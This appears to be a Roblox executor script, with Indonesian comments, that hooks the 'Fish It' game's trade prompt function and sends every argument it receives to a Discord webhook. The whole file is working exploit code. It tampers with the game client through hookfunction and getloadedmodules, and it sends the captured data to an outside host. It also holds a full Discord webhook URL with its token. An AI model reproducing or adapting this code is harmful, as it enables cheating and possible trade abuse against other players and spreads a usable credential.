local HttpService = game:GetService("HttpService")
local WebhookURL = "https://discordapp.com/api/webhooks/1450517804037046508/yi2ZuXEbsPhSQU6MaJ2fgmvm4YPGSz1G0q1oHpApUiYpRrDFCAd1-kuYC4q0sxZ8YOKY"

local function sendLog(title, desc, color)
    pcall(function()
        request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                username = "🕵️ Hook Spy",
                embeds = {{
                    title = title,
                    description = desc,
                    color = color or 16776960, -- Kuning
                    footer = {text = "Fish It Data Spy • " .. os.date("%H:%M:%S")}
                }}
            })
        })
    end)
end

local PromptController = nil

for _, module in pairs(getloadedmodules()) do
    if module.Name == "PromptController" then
        local success, result = pcall(require, module)
        if success then
            PromptController = result
            break
        end
    end
end

if PromptController and type(PromptController.Prompt) == "function" then
    local oldPrompt
    oldPrompt = hookfunction(PromptController.Prompt, function(...)
        local args = {...}
        local debugStr = ""
        
        -- Membedah semua argumen yang masuk ke fungsi Prompt
        for i, v in ipairs(args) do
            local typeV = type(v)
            debugStr = debugStr .. "Arg["..i.."]: Type = " .. typeV .. " | Value = " .. tostring(v) .. "\n"
            
            -- Jika argumen berupa table, kita bedah isinya selapis
            if typeV == "table" then
                for k, val in pairs(v) do
                    debugStr = debugStr .. "   ["..tostring(k).."] = " .. tostring(val) .. " ("..type(val)..")\n"
                end
            end
        end
        
        -- Kirim hasil intaian ke Discord
        sendLog("🔍 SPY: Fungsi Prompt Dipanggil!", "Data yang dikirim game:\n```lua\n" .. debugStr .. "\n```", 16776960)
        
        -- Biarkan UI tetap muncul agar game tidak error saat testing
        return oldPrompt(...)
    end)
    
    sendLog("✅ Spy Terpasang", "Hook berhasil ditanam ke fungsi Prompt. Silakan suruh temanmu request trade sekarang!", 3066993)
else
    sendLog("❌ Gagal", "PromptController tidak ditemukan atau tidak memiliki fungsi 'Prompt'.", 16711680)
end
